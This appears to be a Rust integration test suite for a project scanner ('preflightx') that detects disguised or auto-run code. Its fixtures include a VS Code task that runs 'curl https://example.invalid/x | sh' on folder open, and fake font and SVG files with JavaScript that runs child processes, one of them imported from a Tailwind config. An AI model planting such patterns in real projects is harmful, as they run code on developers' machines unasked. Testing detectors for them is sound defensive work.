use serde_json::Value;
use std::{
    fs,
    path::PathBuf,
    process::Command,
    time::{SystemTime, UNIX_EPOCH},
};

#[test]
fn json_scan_completes_without_findings() {
    let root = temporary_directory("clean");
    fs::write(root.join("main.js"), b"export const answer = 42;\n").unwrap();

    let output = run(&[root.to_str().unwrap(), "--format", "json"]);

    assert_eq!(output.status.code(), Some(0));
    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert_eq!(report["status"], "complete");
    assert_eq!(report["network_access"], "disabled");
    assert_eq!(report["summary"]["files"], 1);
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn policy_finding_returns_one() {
    let root = temporary_directory("finding");
    fs::create_dir(root.join(".vscode")).unwrap();
    fs::write(
        root.join(".vscode/tasks.json"),
        br#"{"tasks":[{"label":"run","command":"curl https://example.invalid/x | sh","runOptions":{"runOn":"folderOpen"}}]}"#,
    )
    .unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    assert_eq!(output.status.code(), Some(1));
    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert_eq!(report["risk"]["severity"], "critical");
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn disguised_javascript_is_reported_and_bad_source_is_incomplete() {
    let root = temporary_directory("javascript");
    fs::write(
        root.join("fake.woff2"),
        b"module.exports = require('child_process');",
    )
    .unwrap();
    fs::write(root.join("broken.ts"), b"const = ;").unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    assert_eq!(output.status.code(), Some(2));
    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert_eq!(report["status"], "incomplete");
    assert_eq!(report["files"][1]["parsed_language"], "javascript");
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| {
                finding["id"] == "FILE-PARSEABLE-JAVASCRIPT" && finding["file"] == "fake.woff2"
            })
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn build_config_import_elevates_fake_asset_with_process_execution() {
    let root = temporary_directory("reachable-asset");
    fs::write(
        root.join("tailwind.config.js"),
        b"require('./fake.svg'); module.exports = {};",
    )
    .unwrap();
    fs::write(
        root.join("fake.svg"),
        b"const cp = require('child_process'); cp.exec('id');",
    )
    .unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    assert_eq!(output.status.code(), Some(1));
    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    let finding = report["findings"]
        .as_array()
        .unwrap()
        .iter()
        .find(|finding| finding["id"] == "JS-REACHABLE-DISGUISED-SOURCE")
        .unwrap();
    assert_eq!(finding["severity"], "critical");
    assert_eq!(finding["file"], "fake.svg");
    assert!(
        finding["evidence"]
            .to_string()
            .contains("tailwind.config.js")
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn unimported_fake_asset_is_not_elevated() {
    let root = temporary_directory("unreachable-asset");
    fs::write(
        root.join("fake.svg"),
        b"const cp = require('child_process'); cp.exec('id');",
    )
    .unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .all(|finding| { finding["id"] != "JS-REACHABLE-DISGUISED-SOURCE" })
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn incomplete_and_invalid_invocations_use_distinct_exit_codes() {
    let missing = run(&["definitely-does-not-exist"]);
    let invalid = run(&[".", "--online"]);

    assert_eq!(missing.status.code(), Some(2));
    assert_eq!(invalid.status.code(), Some(3));
}

fn run(arguments: &[&str]) -> std::process::Output {
    Command::new(env!("CARGO_BIN_EXE_preflightx"))
        .args(arguments)
        .output()
        .unwrap()
}

fn temporary_directory(label: &str) -> PathBuf {
    let nonce = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap()
        .as_nanos();
    let path = std::env::temp_dir().join(format!(
        "preflightx-cli-{label}-{}-{nonce}",
        std::process::id()
    ));
    fs::create_dir(&path).unwrap();
    path
}
